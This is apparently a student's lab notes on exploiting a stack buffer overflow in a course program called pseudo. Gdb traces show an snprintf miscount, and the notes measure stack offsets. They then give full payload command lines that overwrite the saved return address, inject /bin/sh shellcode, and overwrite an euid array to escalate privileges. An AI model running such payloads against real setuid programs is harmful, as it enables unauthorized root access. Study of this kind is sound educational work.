```
mocha:~/a2$ env -i ./pseudoyeeeeet "VladimirRootin" /bin/bash "Hello" "AAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"
😸: Found passwd entry for 'VladimirRootin' (2028)
Upon successful authentication, I shall execve into:
/bin/bash Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEpassword for VladimirRootin:
```
 - Truncates input such that all args 2+ to 252 characters, supposed to add a newline to the end of it (before `password for ...`) but it is clearly not doing that
```
(gdb) p chars_written
$7 = 9
(gdb) p cmdline
$8 = "/bin/bash\000UUUU\000\000\200\354\377\377\377\177\000\000VYUUUU\000\000\200\354\377\377\377\177\000\000\200\353\377\377\377\177\000\000\300\352\377\377\377\177\000\000@\353\377\377\377\177\000\000 \000\000\000\060\000\000\000\240\352\377\377\377\177\000\000\340\351\377\377\377\177\000\000\000pO\343\343\317IKVladimirRootin\000\062\065\065\000\064\062\065\062fb208a3bcbb14d46a9be43966219650c38132a43ab4c326c603ccc1dbdc8\n", '\000' <repeats 28 times>...
```
 - Some random data is exposed at the end of `cmdline` that has not been overwritten yet. Specifically `VladimirRootin` and what looks like a hash string (ending in `\n`), not sure what that is
	 - This is with a breakpoint at line 210, after `/bin/bash` has been written to `cmdline` but before anything else
 - After the loop is done:
```
(gdb) p cmdline
$14 = "/bin/bash Hello ", 'A' <repeats 50 times>, 'B' <repeats 50 times>, 'C' <repeats 50 times>, 'D' <repeats 50 times>...
(gdb) p chars_written
$15 = 416
(gdb) printf "%s\n", cmdline
/bin/bash Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
```
 - The resulting `cmdline` is 252 chars long, but `chars_written` is 416 chars
 - It then places `\n` into `cmdline[chars_written]`, which is visible here in a spot that it shouldn't be accessing
```
(gdb) info locals
cmdline = "/bin/bash Hello ", 'A' <repeats 50 times>, 'B' <repeats 50 times>, 'C' <repeats 50 times>, 'D' <repeats 50 times>...
truncate_after = 256
chars_written = 416
(gdb) p &cmdline
$20 = (char (*)[256]) 0x7fffffffe980
(gdb) p/x 0x7fffffffe980+416
$23 = 0x7fffffffeb20
(gdb) x/1cb 0x7fffffffeb20
0x7fffffffeb20: 10 '\n'
```
 - `snprintf` seems to increment `chars_written` by whatever the string is, not by how much it actually writes. If all the arguments are really big it might start randomly writing into memory
 - After printing a shitload of our random characters, it looks like it is just printing into memory. This then eventually seg faults (I assume it is trying to write too deep into memory, or broke the return address)
```
(gdb) p chars_written
$5 = 801
(gdb) p &cmdline
$6 = (char (*)[256]) 0x7fffffffe4e0
(gdb) p/x 0x7fffffffe4e0 + 400
$7 = 0x7fffffffe670
(gdb) x/100cb 0x7fffffffe670
0x7fffffffe670: 32 ' '  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe678: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe680: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe688: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe690: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe698: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe6a0: 65 'A'  65 'A'  65 'A'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe6a8: 66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe6b0: 66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe6b8: 66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe6c0: 66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe6c8: 66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe6d0: 66 'B'  66 'B'  66 'B'  66 'B'
(gdb) p/x 0x7fffffffe4e0 + 800
$8 = 0x7fffffffe800
(gdb) x/100cb 0x7fffffffe800
0x7fffffffe800: 72 'H'  32 ' '  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe808: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe810: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe818: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe820: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe828: 65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'  65 'A'
0x7fffffffe830: 65 'A'  65 'A'  65 'A'  65 'A'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe838: 66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe840: 66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe848: 66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe850: 66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe858: 66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'  66 'B'
0x7fffffffe860: 66 'B'  66 'B'  66 'B'  66 'B'
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
```
 - This starts at the memory that is being written, consider the following diagram
```
0  50  100 150 200 249 250 300 350 400 401 451 501 551 601 651 701 751 801 802 852
A   B   C   D   E   E   .   .   .   .   A   B   C   D   E   F   G   H  ' '  A   B
```
 - This diagram considers input values of size 400, each char from A to H is included 50 times
	 - So the first 400 prints 249 chars (`n-6` = `256-6` = `250` + null char = `249`, up to the end of E - 1)
	 - This sets `chars_written` to be 400, not 250. 
		 - When it writes to memory again it starts writing to 401. It seems to add a space at the start of each print (first one starts at 401, next is 802)
	 - For some reason now that the `maxlen` for `snprintf` is hugely negative it just prints the entire thing to memory. Repeat until it seg faults
### Idea
 - Blow up the return address to `echo_cmdline` to instead return to some shellcode that we also inject through the arguments

Following the fault found in [[echo_cmdline]]
### Smashing the Return Address
 - It seems that the return address of `echo_cmdline` and the address of `cmdline` is 280 bytes apart
```
(gdb) info frame
Stack level 0, frame at 0x7fffffffeb30:
 rip = 0x555555555a5d in echo_cmdline (pseudo.c:205); saved rip = 0x555555555d40
 called by frame at 0x7fffffffec30
 source language c.
 Arglist at 0x7fffffffeb20, args: argc=4, argv=0x7fffffffed18, n=256
 Locals at 0x7fffffffeb20, Previous frame's sp is 0x7fffffffeb30
 Saved registers:
  rbp at 0x7fffffffeb20, rip at 0x7fffffffeb28
(gdb) p &cmdline
$1 = (char (*)[256]) 0x7fffffffea10
(gdb) p 0x7fffffffeb28 - 0x7fffffffea10
$2 = 280
```
 - By setting the first argument to pseudo to be an arbitrary existing user, the second argument to be a random string of size 279 (a space is added each time in the loop), and the third argument as a pointer to our shellcode, we can smash the return address to `echo_cmdline` to be our malicious pointer
```
>>> gdb --args env -i ./pseudoyeeeeet VladimirRootin "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" $'\x34\x12\xff\xff\xff\x7f'

(gdb) info frame
Stack level 0, frame at 0x7fffffffeb30:
 rip = 0x555555555b2d in echo_cmdline (pseudo.c:208); saved rip = 0x7fffffff1234
 called by frame at 0x7fffffffeb38
 source language c.
 Arglist at 0x7fffffffeb20, args: argc=4, argv=0x7fffffffed18, n=256
 Locals at 0x7fffffffeb20, Previous frame's sp is 0x7fffffffeb30
 Saved registers:
  rbp at 0x7fffffffeb20, rip at 0x7fffffffeb28

(gdb) x/10xg 0x7fffffffea10 + 280
0x7fffffffeb28: 0x00007fffffff1234      0x00007fffffffed18
0x7fffffffeb38: 0x0000000400000340      0x0000034000000340
0x7fffffffeb48: 0x0000034000000340      0x3032626632353234
0x7fffffffeb58: 0x3162626362336138      0x6562396136346434
0x7fffffffeb68: 0x3931323636393334      0x3331383363303536
```
 - As you can see, `rip` of the frame for `echo_cmdline` is `0x7fffffffeb28: 0x00007fffffff1234` which is our malicious pointer
 - Continuing the program from this point instantly seg faults as the current address is not valid

### Creating the Shellcode
 - Shellcode provided from the lecture
`\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3`
 - Address of `argv[4]`
```
(gdb) p &argv[4]
$6 = (char **) 0x7fffffffec78
```
- Formulated command:
```
gdb --args env -i ./pseudoyeeeeet VladimirRootin "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" $'\x28\xed\xff\xff\xff\x7f' $'\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3'
```
 - This command mostly works but we get a bunch of extra bullshit in front of our malicious pointer
```
(gdb) x/1xg 0x7fffffffeb18
0x7fffffffeb18: 0xeb207fffffffed28
```
 - Since C-strings are always NUL terminated, an empty string is just a single NUL, we can hopefully fix this by adding a trailing blank whitespace
```
gdb --args env -i ./pseudoyeeeeet VladimirRootin "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" $'\x18\xed\xff\xff\xff\x7f\0\0' '' $'\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3'
```
 - This is resulting in some weird stuff
```
(gdb) x/1xg 0x7fffffffeb08
0x7fffffffeb08: 0x20207fffffffed18
(gdb) x/1xg argv[3]
0x7fffffffefd6: 0x00007fffffffed18
```
 - Where the address is being pushed onto the stack with `2020` but the address itself starts with `0000`, I assume this is because the `NUL`s aren't overwriting whatever is currently in that memory address?
 - Those `x20`s are spaces..., its also possible this just doesn't work against mocha
```
Now as for the concept of your attack. It is definitely a good idea in general, but is it possible to use against `pseudo`? Think more generally about whether or not shellcode works against `pseudo` (think about the compiler options / think about options discussed during lectures that is missing).
```

### New Idea
 - Buffer overflow and smash `euid` such that `euid = { 255, 0 }`
```
(gdb) p &euid
$2 = (uid_t (*)[2]) 0x7fffffffebf0
(gdb) c
Continuing.
(gdb) p &cmdline
$3 = (char (*)[256]) 0x7fffffffe9f0
(gdb) p 0x7fffffffebf0 - 0x7fffffffe9f0
$4 = 512
```
 - Not sure if this is doable as changing `argv` will probably change where `euid` is relative to `cmdline`?
	 - Looks like this isn't the case and the difference between these things is always 512?
 - Process:
	 - Write a string that is 511 characters long (plus a space at the start of the next one)
	 - Write a large hex value equal to `{0x000000ff, 0x00000000}` = `0x00000000000000ff`
		 - = `\xff\x00\x00\x00\x00\x00\x00\x00`
 - Command:
```
gdb --args env -i ./pseudoyeeeeet RootpertMurdoch "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEAAAAAAAAAAA" $'\xff\x00\x00\x00\x00\x00\x00\x00' '' '' '' '' '' '' ''
```

[[Exploit 2]]